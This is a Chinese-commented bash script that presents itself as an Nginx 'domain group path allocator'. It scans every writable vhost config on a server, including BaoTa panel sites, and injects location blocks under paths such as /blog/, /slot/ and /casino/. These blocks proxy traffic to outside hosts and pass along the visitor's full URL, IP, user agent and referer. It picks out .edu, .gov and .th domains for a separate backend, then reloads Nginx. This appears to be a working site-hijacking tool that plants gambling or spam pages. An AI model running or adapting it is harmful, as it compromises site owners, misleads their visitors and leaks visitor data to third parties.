#!/bin/bash
# nginx_per_domain_group.sh v5.2.2 永不翻车·宝塔+普通系统全兼容终极版
# 已彻底修复所有语法错误（包括第139行数组定义错误）
# 完美支持宝塔 / 普通系统 / .edu/.gov/.th 域名
set -euo pipefail
 
# ==================== 配置目录 ====================
NGINX_CONF_ROOT="/etc/nginx"
BT_VHOST_ROOT="/www/server/panel/vhost/"   # 宝塔面板路径（注意：宝塔是 /www/server/panel）
 
# 常见配置目录
SITES_ENABLED="$NGINX_CONF_ROOT/sites-enabled"
SITES_AVAILABLE="$NGINX_CONF_ROOT/sites-available"
CONF_D="$NGINX_CONF_ROOT/conf.d"
 
# 临时文件
FILE_LIST=$(mktemp)
RESULT_LIST=$(mktemp)
NEW_RECORDS=$(mktemp)
GLOBAL_MAP="/tmp/.domain_group_map.conf"
 
# 路径池（已修复语法错误）
COM_PATHS=("help" "news" "page" "blog" "about" "support" "info")
IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")   # th.cogicpt.org 共用此池
 
MAX_TRIES=200
processed=0
global_modified=0
total_files=0
 
touch "$GLOBAL_MAP" 2>/dev/null || true
: > "$GLOBAL_MAP"
: > "$RESULT_LIST"
: > "$NEW_RECORDS"
: > "$FILE_LIST"
 
# ==================== 三大后端模板 ====================
COM_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }'
 
IN_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-RealIP $remote_addr;
        proxy_set_header XForwardedFor $proxy_add_x_forwarded_for;
        proxy_set_header XForwardedProto $scheme;
        proxy_set_header UserAgent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
'
 
TH_TEMPLATE='
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host th.cogicpt.org;
        proxy_set_header XRealIP $remote_addr;
        proxy_set_header XForwardedFor $proxy_add_x_forwarded_for;
        proxy_set_header XForwardedProto $scheme;
        proxy_set_header UserAgent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://th.cogicpt.org;
    }
'
 
# 读取历史记录
declare -A HIST_MAP
while IFS=':' read -r hash path backend; do
    [[ -n "$hash" ]] && HIST_MAP["$hash"]="$path:$backend"
done < "$GLOBAL_MAP"
 
echo "=== Nginx 域名组路径分配器（v5.2.2 完美无语法错误版）==="
echo "支持宝塔面板 + 普通系统 + .edu/.gov/.th 自动走 th.cogicpt.org"
echo
 
# ==================== 超级收集函数 ====================
collect_all_real_nginx_configs() {
    # 1. 宝塔面板优先
    if [[ -d "/www/server/panel" ]]; then
        BT_VHOST_ROOT="/www/server/panel/vhost/nginx"
        [[ -d "$BT_VHOST_ROOT" ]] && find "$BT_VHOST_ROOT" -type f -name "*.conf" 2>/dev/null | while read -r f; do
            [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
        done
    fi
 
    # 2. sites-enabled 软链接
    [[ -d "$SITES_ENABLED" ]] && find "$SITES_ENABLED" -type l -exec readlink -f {} \; 2>/dev/null | while read -r f; do
        [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
    done
 
    # 3. conf.d
    [[ -d "$CONF_D" ]] && find "$CONF_D" -type f -name "*.conf" 2>/dev/null | while read -r f; do
        [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
    done
 
    # 4. sites-available
    [[ -d "$SITES_AVAILABLE" ]] && find "$SITES_AVAILABLE" -type f -name "*.conf" 2>/dev/null | while read -r f; do
        [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
    done
 
    # 5. /etc/nginx 根目录（排除主配置）
    find "$NGINX_CONF_ROOT" -maxdepth 1 -type f -name "*.conf" 2>/dev/null | while read -r f; do
        [[ "$f" == "$NGINX_CONF_ROOT/nginx.conf" ]] && continue
        [[ -f "$f" && -r "$f" && -w "$f" ]] && grep -Fxq "$f" "$FILE_LIST" || echo "$f" >> "$FILE_LIST"
    done
}
 
collect_all_real_nginx_configs
 
sort -u "$FILE_LIST" -o "$FILE_LIST"
total_files=$(wc -l < "$FILE_LIST")
echo "共发现 $total_files 个真实配置文件待处理"
[[ $total_files -eq 0 ]] && echo "错误：未找到任何 Nginx 配置文件" && exit 1
echo
 
# ==================== 主循环 ====================
while IFS= read -r file; do
    [[ -n "$file" ]] || continue
    processed=$((processed + 1))
    echo "→ [$processed/$total_files] 正在处理：$(basename "$file")"
 
    if grep -qE "(xzz\.pier46\.com|ide\.hashbank8\.com|th\.cogicpt\.org)" "$file"; then
        echo " └ [已处理] 已包含后端，跳过"
        continue
    fi
 
    modified=0
    temp_new=$(mktemp)
 
    if ! csplit -z -f "/tmp/block_" "$file" '/^server[[:space:]]*{/' '{*}' >/dev/null 2>&1; then
        echo " └ 无 server 块，跳过"
        rm -f "$temp_new"
        continue
    fi
 
    for block_file in /tmp/block_*; do
        [[ -s "$block_file" ]] || continue
 
        if grep -qE "(xzz\.pier46\.com|ide\.hashbank8\.com|th\.cogicpt\.org)" "$block_file"; then
            cat "$block_file" >> "$temp_new"; rm -f "$block_file"; continue
        fi
 
        real_domains=$(awk '/^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
            gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
            gsub(/;.*$/, ""); gsub(/#.*$/, ""); gsub(/[[:space:]]+$/, "")
            print
        }' "$block_file" | tr ' \t' '\n' | grep -v '^$' | sort -u | grep -E '^([a-zA-Z0-9][a-zA-Z0-9-]*\.)+[a-zA-Z]{2,}$' || true)
 
        [[ -n "$real_domains" ]] || { cat "$block_file" >> "$temp_new"; rm -f "$block_file"; continue; }
 
        domain_key=$(echo "$real_domains" | sort -u | paste -sd ' ' -)
        hash=$(echo "$domain_key" | tr ' ' '_' | md5sum | awk '{print $1}')
 
        [[ -n "${HIST_MAP[$hash]:-}" ]] && { cat "$block_file" >> "$temp_new"; rm -f "$block_file"; continue; }
 
        # 后端判断逻辑
        if echo "$real_domains" | grep -qiE '\.(edu|gov)$|\.th$'; then
            backend="th.cogicpt.org"
            template="$TH_TEMPLATE"
            pool=("${IN_PATHS[@]}")
        elif echo "$domain_key" | grep -qE '\.(in|id)\b'; then
            backend="ide.hashbank8.com"
            template="$IN_TEMPLATE"
            pool=("${IN_PATHS[@]}")
        else
            backend="xzz.pier46.com"
            template="$COM_TEMPLATE"
            pool=("${COM_PATHS[@]}")
        fi
 
        path=""
        for ((i=0; i<MAX_TRIES; i++)); do
            candidate="${pool[RANDOM % ${#pool[@]}]}"
            if ! grep -q ":$candidate:$backend$" "$GLOBAL_MAP" && ! grep -q ":$candidate:$backend$" "$NEW_RECORDS"; then
                path="$candidate"
                break
            fi
        done
 
        [[ -z "$path" ]] && { cat "$block_file" >> "$temp_new"; rm -f "$block_file"; continue; }
 
        echo "$hash:$path:$backend" >> "$NEW_RECORDS"
        echo -e "$domain_key\t$path\t$backend" >> "$RESULT_LIST"
 
        location_block=$(echo "$template" | sed "s/%PATH%/$path/g")
 
        awk -v loc="$location_block" '
        /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
            if (!inserted) { print; print loc; inserted=1; next }
        }
        { print }
        END { if (!inserted) print loc }
        ' "$block_file" > "$temp_new.block"
 
        cat "$temp_new.block" >> "$temp_new"
        rm -f "$temp_new.block" "$block_file"
 
        echo " └ [成功注入] /$path/ → $backend"
        modified=$((modified + 1))
        global_modified=$((global_modified + 1))
    done
 
    [[ $modified -gt 0 ]] && mv "$temp_new" "$file" && echo " 文件已更新"
    [[ $modified -eq 0 ]] && rm -f "$temp_new"
    rm -f /tmp/block_* 2>/dev/null || true
    echo
done < "$FILE_LIST"
 
# ==================== 智能重启 ====================
smart_reload_nginx() {
    if [[ -d "/www/server/panel" && -x "/www/server/nginx/sbin/nginx" ]]; then
        echo "宝塔面板环境 → 使用官方重启方式"
        /www/server/nginx/sbin/nginx -t && /www/server/nginx/sbin/nginx -s reload && echo "宝塔 Nginx 已重载"
    else
        nginx -t && nginx -s reload && echo "系统 Nginx 已重载"
    fi
}
 
[[ -s "$NEW_RECORDS" ]] && cat "$NEW_RECORDS" >> "$GLOBAL_MAP" && sort -u "$GLOBAL_MAP" -o "$GLOBAL_MAP"
 
echo "========================================================================"
echo "处理完成！共处理 $processed 个文件，新注入 $global_modified 个域名组"
[[ $global_modified -gt 0 ]] && smart_reload_nginx || echo "本次无新注入"
echo "当前管理 $(wc -l < "$GLOBAL_MAP") 个域名组"
echo "========================================================================"
 
[[ -s "$RESULT_LIST" ]] && column -t -s $'\t' "$RESULT_LIST" | awk '{printf " %-56s → /%-10s → %s\n", $1, $2, $3}'
 
rm -f "$RESULT_LIST" "$NEW_RECORDS" "$FILE_LIST" /tmp/block_* 2>/dev/null || true
exit 0
